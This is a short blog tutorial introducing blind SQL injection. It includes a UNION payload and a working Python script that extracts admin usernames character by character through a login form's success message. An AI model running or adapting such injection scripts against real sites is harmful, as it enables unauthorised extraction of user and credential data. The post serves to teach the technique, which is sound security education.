---
layout: post
title: "Blind SQL Injection - A brief introduction"
date: 2019-10-18 +0100
categories: hacking
---
[SQL Injection](https://en.wikipedia.org/wiki/SQL_injection) can sometimes be as simple as `'0 UNION SELECT * FROM users;--` and suddenly you end up with a dump of the users table in a web application. But what happens when your output isn't reflected back to you? Can we still exploit the unvalidated input?

### Blind SQL Injection
Utilizing a SQL Injection where we can't get the output of the SQL Query is just as potent and dangerous, as one where the output is reflected back to the attacker.

Instead of querying directly, we find a way to get a binary result, e.g. the website could output an error if a user is not found, and none otherwise. That example could allow us to enumerate names, addresses, usernames, or even passwords.

### Leaking usernames from an `admins` table

Like every SQL Injection is unique and must be tailored to the target application, so is the case for Blind SQL Injection.

In this example we can `post` a `username` and `password` field to a website vulnerable to a SQL Injection, however, being a login page, it will only log us in and not output the result of the SQL query.

So how does the login code work in the web application? It most probably fetches a username and password from the database, and compares them with the fields from the `post`. For this example, assume that the password will not be hashed, as this would break this particular example.

```python
#!/usr/bin/python

import requests
import string
import sys

url = "http://vulnerable.com/login"

# Let's set a max on 14 characters
USER_LENGTH_MAX = 14 

def payload_pos(i):
    return "' UNION SELECT SUBSTR(username,"+str(i)+",1) FROM admins; --"


user = ""
i = 1
while i < USER_LENGTH_MAX:
    for c in string.printable:
        if c == '\n' or c == "\\" or c == "'" or c == "%":
           continue 
        sys.stdout.write('\rTrying ' + c)
        sys.stdout.flush()
        boom = {"username": payload_pos(i), 
                "password": c
                }
        res = requests.post(url, data=boom)
        if "Logged in!" in res.text:
            user = user + str(c)
            print("\nfound: {}".format(user))
            i = i + 1
            break

```

As you can see, our payload `boom` consists of the two fields `username` and `password`. We then iterate all possible printable characters in the username, and get the web application to compare the result for us. If we get logged in, then we found a matching character. 

By scripting over a simple binary output, logged in, or not logged in, we can extract arbitrary data from the database. 